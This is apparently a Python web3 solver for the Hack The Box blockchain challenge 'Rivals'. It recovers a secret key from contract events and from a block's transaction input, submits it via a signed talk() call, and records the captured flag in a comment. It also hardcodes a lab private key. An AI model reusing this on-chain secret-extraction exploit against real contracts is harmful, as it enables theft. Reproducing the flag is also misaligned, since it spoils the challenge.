from web3 import Web3
import json
from web3.gas_strategies.rpc import rpc_gas_price_strategy
from solcx import compile_source, install_solc, compile_files

x = {
    "PrivateKey": "0xfa57c397fbaf30542dad09c13b3201d2aa5faa80253994986076d0e52b367c18",
    "Address": "0xc35bf156c77D1D51b28a581F6c1a774a3Cea83f5",
    "TargetAddress": "0x6a5a9431c32e12289921B469E1ce9e9522D9223e",
    "setupAddress": "0x732fBbcBF3d52d0D590CBBa3fcEa8cda12eE4930"
}

PrivateKey =    x["PrivateKey"]
Address =       x["Address"] 
TargetContract = x["TargetAddress"]
SetupContract =  x["setupAddress"]

url = 'http://157.245.43.189:30548/rpc'

w3 = Web3(Web3.HTTPProvider(url))
block_number = w3.eth.block_number
print(block_number)

account_address = Address
balance = w3.eth.get_balance(account_address)
print(balance)

install_solc("0.8.13")

compiled = compile_files(["Rivals.sol"], output_values=["abi"], solc_version="0.8.13")
abi = compiled['Rivals.sol:Rivals']['abi']


contract = w3.eth.contract(address=TargetContract, abi=abi)

event_filter = contract.events.Voice.create_filter(fromBlock='earliest', argument_filters={'severity': 5})

# Retrieve the events
events = event_filter.get_all_entries()

# Check if the event with severity 5 exists
if len(events) > 0:
    print("Event with severity 5 exists.")
    # Loop through the events to access each event's data
    for event in events:
        # Access the parameters of the event
        severity_value = event['args']['severity']
        # Check if the event contains the '_key' parameter
        if '_key' in event['args']:
            key_value = event['args']['_key']
            print(f"Severity: {severity_value}, Key: {key_value}")
        else:
            print(f"Severity: {severity_value}, Key not available. {event}, {event['args']}")
else:
    print("No event with severity 5 found.")

block_number = 38
block = w3.eth.get_block(block_number)

# Check if the block exists
if block is not None:
    # Access block information
    block_hash = block['hash']
    block_timestamp = block['timestamp']
    block_transactions = block['transactions']

    print(f"Block Number: {block_number}")
    print(f"Block Hash: {block_hash}")
    print(f"Block Timestamp: {block_timestamp}")

    # Retrieve and print transaction details for each transaction in the block
    for tx_hash in block_transactions:
        tx = w3.eth.get_transaction(tx_hash)
        if tx is not None:
            print(tx) 
else:
    print(f"Block {block_number} not found.")

#block input
key0 = '52eab0fae1ded0b0d4b71aa0733c146f5f328aa3935a513d1dd24480bd4f23aa2a691ff2'
key1 = '96a3834dd4815e2d679905d553a93cfd2b19b454e7174bc2bdb47001344ff306'
key2 = '0237c1161c0d7758bd9f2bb49f6efbad807f843d9d8a9382b853e8d73fbc8eac'
#get key from block:input
key3 = key0[8:]
key4 = key0[:-8]

#key = bytes.fromhex(key1[2:])

#keys = [key1, key2, key3, key4]
keys = [key3]

account_from = {
        'private_key': PrivateKey,
        'address': account_address,
}

contract_instance2 = w3.eth.contract(address=TargetContract, abi=abi)

for keyx in keys:
	key = bytes.fromhex(keyx)
	construct_txn = contract_instance2.functions.talk(key).build_transaction(
		{
			'from': account_from['address'],
			'nonce': w3.eth.get_transaction_count(account_from['address']),
			#'from': Target2Address,
			#'nonce': w3.eth.get_transaction_count(Target2Address),
			'chainId': w3.eth.chain_id,
			#'value' : 1
			#"gasPrice": w3.to_wei(50, 'gwei'),
			#"gas": 21000,
			#"value": w3.to_wei("0", "ether"),
		}
	)
	tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
	tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
	tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
	print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')

	compiled = compile_files(["Setup.sol"], output_values=["abi"], solc_version="0.8.13")
	abi = compiled['Setup.sol:Setup']['abi']

	contract_instance = w3.eth.contract(address=SetupContract, abi=abi)
	number = contract_instance.functions.isSolved(account_address).call()

	print(f'The current number stored is: { number } ')
	#HTB{d0n7_741k_11573n_70_3v3n75!}
